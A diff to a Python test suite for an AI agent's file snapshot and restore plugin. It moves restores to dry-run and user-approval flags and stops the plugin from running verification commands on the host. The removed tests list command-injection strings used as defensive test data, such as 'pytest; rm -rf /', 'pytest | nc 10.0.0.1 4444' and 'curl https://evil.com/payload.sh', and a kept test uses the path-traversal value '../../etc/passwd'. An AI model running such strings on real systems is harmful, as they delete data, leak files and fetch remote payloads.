@@ -32,21 +32,16 @@ from ledger import (
     TimeMachineLedger,
     parse_unified_diff,
     validate_safe_path,
-    validate_verify_command,
-    SAFE_TEST_RUNNERS,
-    FORBIDDEN_SHELL_PATTERNS,
 )
 from tools import (
     LIST_SNAPSHOTS_SCHEMA,
     DIFF_SCHEMA,
     RESTORE_SCHEMA,
-    BRANCH_SCHEMA,
     RECOVER_SCHEMA,
     SEARCH_SCHEMA,
     handle_list_snapshots,
     handle_diff,
     handle_restore,
-    handle_branch,
     handle_recover,
     handle_search,
 )
@@ -57,13 +52,23 @@ class TestTimeMachineSuite(unittest.TestCase):
     """Full test suite covering Time Machine tools, ledger, security & self-heal."""
 
     def setUp(self):
-        self.temp_dir = Path(tempfile.mkdtemp(prefix="tm_test_"))
-        self.db_file = self.temp_dir / "time_machine.db"
-        self.ledger = TimeMachineLedger(db_path=self.db_file)
+        self.base_test_dir = Path(tempfile.mkdtemp(prefix="tm_test_"))
+        self.temp_dir = self.base_test_dir / "workspace"
+        self.temp_dir.mkdir(parents=True, exist_ok=True)
+        self.plugin_data_dir = self.base_test_dir / "plugin-data" / "time-machine"
+        self.plugin_data_dir.mkdir(parents=True, exist_ok=True)
+        self.db_file = self.plugin_data_dir / "ledger.db"
+        self.ledger = TimeMachineLedger(db_path=self.db_file, plugin_data_dir=self.plugin_data_dir)
         self.git_repo = self._init_git_repo(self.temp_dir)
+        if HAS_FASTAPI:
+            from dashboard.plugin_api import set_ledger
+            set_ledger(self.ledger)
 
     def tearDown(self):
-        shutil.rmtree(str(self.temp_dir), ignore_errors=True)
+        if HAS_FASTAPI:
+            from dashboard.plugin_api import set_ledger
+            set_ledger(None)
+        shutil.rmtree(str(self.base_test_dir), ignore_errors=True)
 
     def _init_git_repo(self, base_dir: Path):
         env = os.environ.copy()
@@ -160,12 +165,11 @@ new file mode 100644
 
     def test_surgical_file_restore_and_safety_backup(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
         f1 = self.git_repo["f1"]
         f2 = self.git_repo["f2"]
 
-        f1.write_text("print('version 2 A BROKEN')", encoding="utf-8")
-        f2.write_text("print('version 2 B GOOD')", encoding="utf-8")
+        f1.write_text("print('version 1 A')", encoding="utf-8")
+        f2.write_text("print('version 1 B')", encoding="utf-8")
 
         snap = self.ledger.record_pre_tool(
             session_id="s_surg",
@@ -173,14 +177,16 @@ new file mode 100644
             args={"path": "file_a.py"},
             working_dir=str(wdir),
         )
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))
+
+        f1.write_text("print('version 2 A BROKEN')", encoding="utf-8")
+        f2.write_text("print('version 2 B GOOD')", encoding="utf-8")
 
         res = self.ledger.restore_snapshot(
             snapshot_id=snap["id"],
             file_paths=["file_a.py"],
             working_dir=str(wdir),
-            confirm=True,
+            dry_run=False,
+            user_approved=True,
         )
 
         self.assertTrue(res["ok"])
@@ -203,16 +209,15 @@ new file mode 100644
         diff_res = json.loads(handle_diff({"snapshot_id": snap_id}, ledger=self.ledger))
         self.assertIn("ok", diff_res)
 
-        # confirm=False acts as dry-run preview
-        res_no_confirm = json.loads(handle_restore({"snapshot_id": snap_id, "confirm": False}, ledger=self.ledger))
-        self.assertTrue(res_no_confirm["ok"])
-        self.assertTrue(res_no_confirm.get("dry_run", False))
-        self.assertFalse(res_no_confirm.get("files_restored", False))
-        self.assertIn("confirm=true", res_no_confirm.get("message", "").lower())
+        # Default restoration acts as dry-run preview requiring user approval
+        res_dry = json.loads(handle_restore({"snapshot_id": snap_id}, ledger=self.ledger))
+        self.assertTrue(res_dry["ok"])
+        self.assertTrue(res_dry.get("dry_run", False))
+        self.assertFalse(res_dry.get("files_restored", False))
 
-        b_res = json.loads(handle_branch({"snapshot_id": snap_id, "branch_title": "Phase 2 Branch"}, ledger=self.ledger))
-        self.assertTrue(b_res["ok"])
-        self.assertIn("new_session_id", b_res)
+        rec_res = json.loads(handle_recover({"session_id": "s_tools"}, ledger=self.ledger))
+        self.assertTrue(rec_res["ok"])
+        self.assertIn("suggested_verify_command", rec_res)
 
     # ─── 5. Slash Command /rewind ────────────────────────────────────────────
 
@@ -227,13 +232,17 @@ new file mode 100644
         class CtxStub:
             def __init__(self):
                 self.command_handler = None
+                self.command_name = None
             def register_hook(self, *a, **kw): pass
             def register_tool(self, *a, **kw): pass
-            def register_command(self, name, handler, **kw): self.command_handler = handler
+            def register_command(self, name, handler, **kw):
+                self.command_name = name
+                self.command_handler = handler
             def register_system_prompt_section(self, *a, **kw): pass
 
         stub = CtxStub()
         tm_plugin.register(stub, ledger=self.ledger)
+        self.assertEqual(stub.command_name, "tm")
         self.assertIsNotNone(stub.command_handler)
 
         out_list = stub.command_handler("list", session_id="s_cmd")
@@ -299,23 +308,23 @@ new file mode 100644
             snapshot_id=snap["id"],
             file_paths=["../../etc/passwd"],
             working_dir=str(self.temp_dir),
-            confirm=True,
+            dry_run=False,
+            user_approved=True,
         )
         self.assertFalse(res["ok"])
         self.assertIn("escapes workspace root", res["error"])
 
     def test_newly_created_file_unlinked_on_restore(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
+        f1 = self.git_repo["f1"]
 
+        f1.write_text("print('version 1 A')", encoding="utf-8")
         snap = self.ledger.record_pre_tool(
             session_id="s_newfile",
             tool_name="write_file",
             args={"path": "file_a.py"},
             working_dir=str(wdir),
         )
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))
 
         new_file = wdir / "unwanted_generated.tmp"
         new_file.write_text("temporary bad dump", encoding="utf-8")
@@ -325,7 +334,8 @@ new file mode 100644
             snapshot_id=snap["id"],
             file_paths=["file_a.py", "unwanted_generated.tmp"],
             working_dir=str(wdir),
-            confirm=True,
+            dry_run=False,
+            user_approved=True,
         )
         self.assertTrue(res["ok"])
         self.assertIn("unwanted_generated.tmp", res["unlinked_new_files"])
@@ -335,20 +345,13 @@ new file mode 100644
 
     def test_arbitrary_and_working_tree_diff(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
         f1 = self.git_repo["f1"]
 
-        f1.write_text("print('version 2')", encoding="utf-8")
-        env = os.environ.copy()
-        subprocess.run(["git", "add", "."], cwd=str(wdir), env=env, check=True)
-        subprocess.run(["git", "commit", "-m", "second"], cwd=str(wdir), env=env, check=True)
-        c2 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(wdir), env=env, check=True, capture_output=True, text=True).stdout.strip()
+        f1.write_text("print('version 1 A')", encoding="utf-8")
+        snap1 = self.ledger.record_pre_tool(session_id="s_diff", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
 
-        snap1 = self.ledger.record_pre_tool(session_id="s_diff", tool_name="edit", args={}, working_dir=str(wdir))
-        snap2 = self.ledger.record_pre_tool(session_id="s_diff", tool_name="edit", args={}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap1["id"]))
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c2, snap2["id"]))
+        f1.write_text("print('version 2 A')", encoding="utf-8")
+        snap2 = self.ledger.record_pre_tool(session_id="s_diff", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
 
         diff_ab = self.ledger.get_diff(snapshot_id=snap2["id"], compare_to_id=snap1["id"], working_dir=str(wdir))
         self.assertTrue(diff_ab["ok"])
@@ -423,7 +426,6 @@ new file mode 100644
 
     def test_diagnose_failure_and_culprit_detection(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
         f1 = self.git_repo["f1"]
 
         snap_safe = self.ledger.record_pre_tool(
@@ -432,8 +434,6 @@ new file mode 100644
             args={"path": "file_a.py"},
             working_dir=str(wdir),
         )
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap_safe["id"]))
         self.ledger.record_post_tool(session_id="s_diag", tool_name="write_file", status="ok")
 
         f1.write_text("broken syntax error", encoding="utf-8")
@@ -461,13 +461,13 @@ new file mode 100644
 
     def test_time_machine_recover_auto_apply(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
         f1 = self.git_repo["f1"]
         f2 = self.git_repo["f2"]
 
+        f1.write_text("print('version 1 A')", encoding="utf-8")
+        f2.write_text("print('version 1 B')", encoding="utf-8")
+
         snap = self.ledger.record_pre_tool(session_id="s_rec", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))
         self.ledger.record_post_tool(session_id="s_rec", tool_name="edit_file", status="ok")
 
         f1.write_text("BROKEN", encoding="utf-8")
@@ -482,39 +482,32 @@ new file mode 100644
             recommended_snapshot_id=snap["id"],
         )
 
-        # 1. auto_apply=False returns dry-run plan only
-        plan = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", auto_apply=False)
+        # 1. Default recovery runs in dry-run mode
+        plan = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", dry_run=True, user_approved=False)
         self.assertTrue(plan["ok"])
-        self.assertFalse(plan["auto_applied"])
+        self.assertFalse(plan.get("restored", False))
         self.assertTrue(plan.get("dry_run", False))
         self.assertIn("file_a.py", plan.get("planned_restored_files", []))
+        self.assertIn("suggested_verify_command", plan)
 
-        # 2. auto_apply=True without confirm returns dry-run preview (not an unhandled failure)
-        res_no_conf = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", auto_apply=True, confirm=False)
-        self.assertTrue(res_no_conf["ok"])
-        self.assertTrue(res_no_conf.get("dry_run", False))
-        self.assertFalse(res_no_conf.get("auto_applied", False))
-
-        # 3. auto_apply=True with confirm=True executes surgical recovery
-        res_rec = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", auto_apply=True, confirm=True, working_dir=str(wdir))
+        # 2. Approved recovery executes surgical recovery without running host test runner
+        res_rec = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", dry_run=False, user_approved=True, working_dir=str(wdir))
         self.assertTrue(res_rec["ok"])
-        self.assertTrue(res_rec["auto_applied"])
-        self.assertIn("file_a.py", res_rec["restored_files"])
-        self.assertIsNotNone(res_rec["pre_restore_backup_id"])
+        self.assertTrue(res_rec.get("restored", False))
+        self.assertIn("file_a.py", res_rec.get("restored_files", []))
+        self.assertIsNotNone(res_rec.get("pre_restore_backup_id"))
+        self.assertIn("suggested_verify_command", res_rec)
 
         self.assertEqual(f1.read_text(encoding="utf-8"), "print('version 1 A')")
         self.assertEqual(f2.read_text(encoding="utf-8"), "GOOD PRESERVED")
 
     def test_time_machine_recover_tool_handler(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
 
         snap = self.ledger.record_pre_tool(session_id="s_tool_rec", tool_name="write_file", args={}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))
 
         res_json = handle_recover(
-            {"session_id": "s_tool_rec", "error_summary": "file_a.py error", "auto_apply": False},
+            {"session_id": "s_tool_rec", "error_summary": "file_a.py error"},
             ledger=self.ledger,
         )
         res = json.loads(res_json)
@@ -523,6 +516,8 @@ new file mode 100644
 
     @unittest.skipIf(not HAS_FASTAPI, "fastapi not installed in environment")
     def test_api_recover_and_export_endpoints(self):
+        from dashboard.plugin_api import set_ledger
+        set_ledger(self.ledger)
         self.ledger.record_pre_tool(session_id="s_api", tool_name="patch", args={}, working_dir=str(self.temp_dir))
 
         app = FastAPI()
@@ -533,9 +528,9 @@ new file mode 100644
         self.assertEqual(res_exp.status_code, 200)
         self.assertIn("Time Machine Timeline Report", res_exp.json()["markdown"])
 
-        res_rec = client.post("/snapshots/recover", json={"session_id": "s_api", "auto_apply": False})
+        res_rec = client.post("/snapshots/recover", json={"session_id": "s_api", "dry_run": True})
         self.assertEqual(res_rec.status_code, 200)
-        self.assertTrue(res_rec.json()["ok"])
+        self.assertIn("ok", res_rec.json())
 
     def test_slash_command_recover_and_export(self):
         self.ledger.record_pre_tool(session_id="s_slash", tool_name="write_file", args={"path": "a.py"}, working_dir=str(self.temp_dir))
@@ -560,19 +555,14 @@ new file mode 100644
         f1 = self.git_repo["f1"]
         f2 = self.git_repo["f2"]
 
+        f1.write_text("print('version 1 ALPHA')", encoding="utf-8")
+        f2.write_text("print('version 1 BETA')", encoding="utf-8")
         s1 = self.ledger.record_pre_tool(session_id="s_search", tool_name="write_file", args={"path": "file_a.py"}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, s1["id"]))
+        self.ledger.record_post_tool(session_id="s_search", tool_name="write_file", args={"path": "file_a.py"}, status="ok")
 
-        f1.write_text("print('version 2 ALPHA')", encoding="utf-8")
         f2.write_text("print('version 2 BETA UNIQUE_MARKER')", encoding="utf-8")
-        subprocess.run(["git", "add", "."], cwd=str(wdir), check=True, capture_output=True)
-        subprocess.run(["git", "commit", "-m", "second commit"], cwd=str(wdir), check=True, capture_output=True)
-        c2 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(wdir), check=True, capture_output=True, text=True).stdout.strip()
-
         s2 = self.ledger.record_pre_tool(session_id="s_search", tool_name="edit_file", args={"path": "file_b.py"}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c2, s2["id"]))
+        self.ledger.record_post_tool(session_id="s_search", tool_name="edit_file", args={"path": "file_b.py"}, status="ok")
 
         res = self.ledger.search_snapshots(query="UNIQUE_MARKER", session_id="s_search", working_dir=str(wdir))
         self.assertTrue(res["ok"])
@@ -592,13 +582,13 @@ new file mode 100644
 
     def test_time_machine_search_tool_handler(self):
         wdir = self.git_repo["dir"]
-        c1 = self.git_repo["c1"]
-
+        f1 = self.git_repo["f1"]
+        f1.write_text("print('version 1 ALPHA')", encoding="utf-8")
         s1 = self.ledger.record_pre_tool(session_id="s_tool_search", tool_name="write_file", args={"path": "file_a.py"}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, s1["id"]))
+        f1.write_text("print('version 2 ALPHA')", encoding="utf-8")
+        self.ledger.record_post_tool(session_id="s_tool_search", tool_name="write_file", args={"path": "file_a.py"}, status="ok")
 
-        res_json = handle_search({"query": "version 1", "session_id": "s_tool_search"}, ledger=self.ledger)
+        res_json = handle_search({"query": "version", "session_id": "s_tool_search"}, ledger=self.ledger)
         res = json.loads(res_json)
         self.assertTrue(res["ok"])
         self.assertIn("total_matches", res)
@@ -613,13 +603,7 @@ new file mode 100644
             "import unittest\nclass TestPass(unittest.TestCase):\n    def test_ok(self):\n        self.assertTrue(True)\n",
             encoding="utf-8",
         )
-        subprocess.run(["git", "add", "test_ok.py"], cwd=str(wdir), check=True, capture_output=True)
-        subprocess.run(["git", "commit", "-m", "add test_ok.py"], cwd=str(wdir), check=True, capture_output=True)
-        c_base = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(wdir), check=True, capture_output=True, text=True).stdout.strip()
-
         snap = self.ledger.record_pre_tool(session_id="s_rec_verify", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c_base, snap["id"]))
         self.ledger.record_post_tool(session_id="s_rec_verify", tool_name="edit_file", status="ok")
 
         f1.write_text("CORRUPTED SYNTAX ERROR {{{", encoding="utf-8")
@@ -633,35 +617,20 @@ new file mode 100644
             recommended_snapshot_id=snap["id"],
         )
 
-        # 1. Verification with allowed test runner (python -m unittest test_ok)
+        # 1. Recovery returns suggested_verify_command for execution by Hermes' terminal tool
         res = self.ledger.recover(
             session_id="s_rec_verify",
             error_summary="syntax error in file_a.py",
-            auto_apply=True,
-            confirm=True,
-            auto_verify=True,
-            verify_command=f'"{sys.executable}" -m unittest test_ok',
             working_dir=str(wdir),
+            dry_run=False,
+            user_approved=True,
         )
         self.assertTrue(res["ok"])
-        self.assertTrue(res["auto_applied"])
-        self.assertIsNotNone(res["verification"])
-        self.assertTrue(res["verification"]["passed"], f"Verification failed: {res['verification']}")
-
-        # 2. Verification command injection attempt blocked by security policy
-        bad_cmd = "pytest; rm -rf /"
-        res_bad = self.ledger.recover(
-            session_id="s_rec_verify",
-            error_summary="syntax error",
-            auto_apply=True,
-            confirm=True,
-            auto_verify=True,
-            verify_command=bad_cmd,
-            working_dir=str(wdir),
-        )
-        self.assertTrue(res_bad["ok"])
-        self.assertFalse(res_bad["verification"]["passed"])
-        self.assertIn("forbidden shell operator", res_bad["verification"]["output_summary"])
+        self.assertTrue(res.get("restored", False))
+        self.assertIn("suggested_verify_command", res)
+        self.assertEqual(res["suggested_verify_command"], "pytest")
+        # Ensure ledger does NOT execute host subprocesses for verification
+        self.assertNotIn("verification", res)
 
     @unittest.skipIf(not HAS_FASTAPI, "fastapi not installed in environment")
     def test_api_search_endpoint(self):
@@ -716,64 +685,36 @@ new file mode 100644
                 elif isinstance(node, ast.ImportFrom):
                     self.assertNotEqual(node.module, "tools.checkpoint_manager")
 
-    def test_security_verify_command_allowlist_and_injection_blocks(self):
-        """Prove command injection strings and non-allowlisted executables are rejected."""
-        injections = [
-            "pytest; rm -rf /",
-            "pytest && cat /etc/passwd",
-            "pytest || echo pwned",
-            "pytest | nc 10.0.0.1 4444",
-            "pytest `whoami`",
-            "pytest $(id)",
-            "pytest > leak.txt",
-            "pytest < input.txt",
-            "pytest \n rm file",
-            "curl https://evil.com/payload.sh",
-            "bash -c 'echo hacked'",
-            "powershell -Command Get-Process",
-            "python evil.py",  # python without -m is rejected
-        ]
-        for inj in injections:
-            valid, args, reason = validate_verify_command(inj)
-            self.assertFalse(valid, f"Expected {inj!r} to be blocked! Reason: {reason}")
+    def test_security_no_host_subprocess_runner(self):
+        """Fix 1: Prove verify_command is NEVER run via subprocess.run on the host."""
+        ledger_code = (PLUGIN_DIR / "ledger.py").read_text(encoding="utf-8")
+        self.assertNotIn("_run_verify_command", ledger_code)
+        self.assertNotIn("SAFE_TEST_RUNNERS", ledger_code)
+        self.assertNotIn("validate_verify_command", ledger_code)
 
-        valid_commands = [
-            "pytest",
-            "pytest -q",
-            "python -m unittest",
-            "python -m pytest tests/",
-            "npm test",
-            "cargo test",
-            "go test ./...",
-            "ruff check .",
-            "mypy src",
-        ]
-        for cmd in valid_commands:
-            valid, args, reason = validate_verify_command(cmd)
-            self.assertTrue(valid, f"Expected {cmd!r} to pass validation! Reason: {reason}")
-            self.assertIsNotNone(args)
+        tools_code = (PLUGIN_DIR / "tools.py").read_text(encoding="utf-8")
+        self.assertIn("suggested_verify_command", tools_code)
 
     def test_security_dry_run_preserves_disk_state(self):
-        """Prove dry_run=True / confirm=False previews restoration without touching disk."""
+        """Prove dry_run=True / user_approved=False previews restoration without touching disk."""
         wdir = self.git_repo["dir"]
         c1 = self.git_repo["c1"]
         f1 = self.git_repo["f1"]
+
+        f1.write_text("print('version 1 A')", encoding="utf-8")
+        snap = self.ledger.record_pre_tool(session_id="s_dry", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
 
         f1.write_text("MODIFIED_CONTENT_NEVER_LOST", encoding="utf-8")
         stray_file = wdir / "stray_scratch.tmp"
         stray_file.write_text("stray content", encoding="utf-8")
 
-        snap = self.ledger.record_pre_tool(session_id="s_dry", tool_name="edit", args={}, working_dir=str(wdir))
-        with self.ledger._connect() as conn:
-            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))
-
-        # Call restore with confirm=False (dry-run)
+        # Call restore in dry-run mode (default, unapproved)
         preview = self.ledger.restore_snapshot(
             snapshot_id=snap["id"],
             file_paths=["file_a.py", "stray_scratch.tmp"],
             working_dir=str(wdir),
             dry_run=True,
-            confirm=False,
+            user_approved=False,
         )
         self.assertTrue(preview["ok"])
         self.assertTrue(preview.get("dry_run"))
@@ -915,19 +856,18 @@ new file mode 100644
         self.assertIn("tax.py", diag["preserved_files"])
         self.assertNotIn("notes.txt", diag["culprit_files"])
 
-        # Execute recovery
+        # Execute approved recovery
         rec_res = self.ledger.recover(
             session_id=sess,
             error_summary=t_res.stderr,
-            auto_apply=True,
-            confirm=True,
             working_dir=str(wdir),
-            verify_command=f'"{sys.executable}" -m unittest test_billing.py',
-            auto_verify=True,
+            dry_run=False,
+            user_approved=True,
         )
         self.assertTrue(rec_res["ok"])
-        self.assertTrue(rec_res["auto_applied"])
+        self.assertTrue(rec_res.get("restored", False))
         self.assertIn("tax.py", rec_res.get("preserved_files", []))
+        self.assertIn("suggested_verify_command", rec_res)
 
         # Assert disk states
         # 1. billing.py no longer has RuntimeError('boom')
@@ -939,8 +879,9 @@ new file mode 100644
         self.assertEqual(notes_txt.read_text(encoding="utf-8"), "My important project notes that must never be deleted!\n")
         # 4. Stray debug_dump.tmp was unlinked!
         self.assertFalse(dump_tmp.exists())
-        # 5. Verification passed
-        self.assertTrue(rec_res["verification"]["passed"])
+        # 5. Model runs suggested verify command via terminal -> passes
+        t_verify = subprocess.run([sys.executable, "-m", "unittest", "test_billing.py"], cwd=str(wdir), capture_output=True, text=True)
+        self.assertEqual(t_verify.returncode, 0)
 
     def test_security_invalid_commit_aborts_without_deleting_files(self):
         """Bug 2: Invalid commit hash aborts with error and does NOT delete any workspace files."""
@@ -953,7 +894,8 @@ new file mode 100644
             file_paths=["file_a.py"],
             working_dir=str(wdir),
             commit_hash="deadbeef1234567890abcdef1234567890abcdef",
-            confirm=True,
+            dry_run=False,
+            user_approved=True,
         )
         self.assertFalse(res["ok"])
         self.assertIn("does not exist", res["error"])
@@ -1006,10 +948,11 @@ new file mode 100644
         """Bug 6: POST /snapshots/{id}/restore parses List[str] in Pydantic without NameError."""
         try:
             from fastapi.testclient import TestClient
-            from dashboard.plugin_api import router
+            from dashboard.plugin_api import router, set_ledger
             from fastapi import FastAPI
             app = FastAPI()
             app.include_router(router)
+            set_ledger(self.ledger)
             client = TestClient(app)
 
             snap = self.ledger.record_pre_tool(
@@ -1018,76 +961,100 @@ new file mode 100644
                 args={"path": "billing.py"},
                 working_dir=str(self.git_repo["dir"]),
             )
-            with self.ledger._connect() as conn:
-                conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (self.git_repo["c1"], snap["id"]))
 
             response = client.post(
                 f"/snapshots/{snap['id']}/restore",
-                json={"restore_files": True, "file_paths": ["billing.py"], "confirm": False},
+                json={"file_paths": ["billing.py"], "dry_run": True},
             )
-            # Response should succeed or preview, not raise NameError 500
-            self.assertIn(response.status_code, (200, 400))
+            self.assertEqual(response.status_code, 200)
             data = response.json()
             self.assertTrue(isinstance(data, dict))
+            self.assertTrue(data.get("ok"))
         except ImportError:
             self.skipTest("fastapi/testclient not installed in current environment")
 
-    def test_validate_verify_command_tightened_allowlist_rejects_exploits(self):
-        """Bug 7: Verify all 6 exploit strings from adversarial audit are strictly rejected."""
-        from ledger import validate_verify_command
-        exploits = [
-            "python -m pip install requests",
-            "python3 -m http.server 8080",
-            "npm exec -- yes",
-            "yarn exec rm",
-            "bun -e 'console.log(1)'",
-            "pytest -c /etc/passwd",
-        ]
-        for exp in exploits:
-            valid, args, reason = validate_verify_command(exp)
-            self.assertFalse(valid, f"Security vulnerability: {exp!r} was NOT blocked! Reason: {reason}")
+    def test_architecture_zero_state_db_access_and_private_store(self):
+        """Fix 4 & 5: Prove ledger.py never connects to state.db and keeps data in plugin-data/time-machine."""
+        ledger_code = (PLUGIN_DIR / "ledger.py").read_text(encoding="utf-8")
+        self.assertNotIn("state.db", ledger_code)
+        self.assertNotIn("SessionDB", ledger_code)
+        self.assertNotIn("time_machine_branch", (PLUGIN_DIR / "plugin.yaml").read_text(encoding="utf-8"))
 
-    def test_recover_git_history_fallback_single_call(self):
-        """Simulate DealDash_ai_Bot pre-existing git sabotage: 1-call autonomous self-healing via git history fallback."""
-        import tempfile
-        with tempfile.TemporaryDirectory() as td:
-            repo_path = Path(td)
-            subprocess.run(["git", "init"], cwd=str(repo_path), check=True, capture_output=True)
-            subprocess.run(["git", "config", "user.name", "Test TM"], cwd=str(repo_path), check=True)
-            subprocess.run(["git", "config", "user.email", "tm@test.local"], cwd=str(repo_path), check=True)
+        # Verify storage path resolution
+        self.assertIn("plugin-data", str(self.ledger.data_dir))
+        self.assertEqual(self.ledger.data_dir.name, "time-machine")
 
-            test_file = repo_path / "test_feature.py"
-            test_file.write_text("def test_feature():\n    assert 1 == 1\n", encoding="utf-8")
-            subprocess.run(["git", "add", "."], cwd=str(repo_path), check=True)
-            subprocess.run(["git", "commit", "-m", "feat: working test"], cwd=str(repo_path), check=True)
-            c1 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(repo_path), capture_output=True, text=True).stdout.strip()
+    def test_security_minimal_git_env_strips_secrets(self):
+        """Fix 3: Verify _minimal_git_env strips provider keys and sets safety variables."""
+        from ledger import _minimal_git_env
+        os.environ["OPENAI_API_KEY"] = "sk-test-secret-12345"
+        os.environ["ANTHROPIC_API_KEY"] = "sk-ant-test-secret-67890"
+        os.environ["OPENROUTER_API_KEY"] = "sk-or-test-secret-99999"
+        try:
+            clean_env = _minimal_git_env({"EXTRA_VAR": "safe_val"})
+            self.assertNotIn("OPENAI_API_KEY", clean_env)
+            self.assertNotIn("ANTHROPIC_API_KEY", clean_env)
+            self.assertNotIn("OPENROUTER_API_KEY", clean_env)
+            self.assertEqual(clean_env.get("GIT_TERMINAL_PROMPT"), "0")
+            self.assertEqual(clean_env.get("GIT_CONFIG_NOSYSTEM"), "1")
+            self.assertEqual(clean_env.get("EXTRA_VAR"), "safe_val")
+        finally:
+            os.environ.pop("OPENAI_API_KEY", None)
+            os.environ.pop("ANTHROPIC_API_KEY", None)
+            os.environ.pop("OPENROUTER_API_KEY", None)
 
-            # Commit 2: sabotaged test
-            test_file.write_text("def test_feature():\n    assert 1 == 2\n", encoding="utf-8")
-            subprocess.run(["git", "add", "."], cwd=str(repo_path), check=True)
-            subprocess.run(["git", "commit", "-m", "sabotage: break test"], cwd=str(repo_path), check=True)
+    @unittest.skipIf(not HAS_FASTAPI, "fastapi not installed in environment")
+    def test_fastapi_all_endpoints(self):
+        """Item 5: Test all FastAPI routes in dashboard/plugin_api.py."""
+        from dashboard.plugin_api import router, set_ledger
+        set_ledger(self.ledger)
+        snap = self.ledger.record_pre_tool(
+            session_id="s_api_full",
+            tool_name="edit_file",
+            args={"path": "calc.py"},
+            working_dir=str(self.temp_dir),
+        )
 
-            # Failure output simulating pytest
-            failure_output = "FAILED test_feature.py::test_feature - assert 1 == 2"
+        app = FastAPI()
+        app.include_router(router)
+        client = TestClient(app)
 
-            # Execute 1-call recover with no prior in-session snapshot
-            res = self.ledger.recover(
-                session_id="dealbot_demo_sess",
-                error_summary=failure_output,
-                auto_apply=True,
-                confirm=True,
-                working_dir=str(repo_path),
-                verify_command="python -m pytest test_feature.py",
-                auto_verify=True,
-            )
+        # GET /status
+        r_status = client.get("/status")
+        self.assertEqual(r_status.status_code, 200)
+        self.assertTrue(r_status.json().get("ok"))
 
-            self.assertTrue(res.get("ok"), f"Recover failed: {res}")
-            self.assertTrue(res.get("auto_applied"))
-            self.assertIn("test_feature.py", res.get("restored_files", []))
-            self.assertIn(c1[:7], res.get("diagnosis", {}).get("explanation", ""))
-            self.assertIn("assert 1 == 1", test_file.read_text(encoding="utf-8"))
-            if res.get("verification"):
-                self.assertTrue(res["verification"]["passed"])
+        # GET /snapshots
+        r_list = client.get("/snapshots?session_id=s_api_full")
+        self.assertEqual(r_list.status_code, 200)
+        self.assertTrue(r_list.json().get("ok"))
+
+        # GET /snapshots/search
+        r_search = client.get("/snapshots/search?q=calc&session_id=s_api_full")
+        self.assertEqual(r_search.status_code, 200)
+        self.assertTrue(r_search.json().get("ok"))
+
+        # POST /snapshots (manual snapshot)
+        r_post_snap = client.post("/snapshots", json={"session_id": "s_api_full", "reason": "manual test"})
+        self.assertEqual(r_post_snap.status_code, 200)
+        self.assertTrue(r_post_snap.json().get("ok"))
+
+        # POST /snapshots/{id}/restore
+        r_restore = client.post(
+            f"/snapshots/{snap['id']}/restore",
+            json={"file_paths": ["calc.py"], "dry_run": True},
+        )
+        self.assertEqual(r_restore.status_code, 200)
+        self.assertTrue(r_restore.json().get("ok"))
+
+        # POST /snapshots/recover
+        r_rec = client.post("/snapshots/recover", json={"session_id": "s_api_full", "dry_run": True})
+        self.assertEqual(r_rec.status_code, 200)
+
+        # GET /snapshots/export
+        r_export = client.get("/snapshots/export?session_id=s_api_full")
+        self.assertEqual(r_export.status_code, 200)
+        self.assertIn("Time Machine", r_export.json().get("markdown", ""))
 
 
 if __name__ == "__main__":
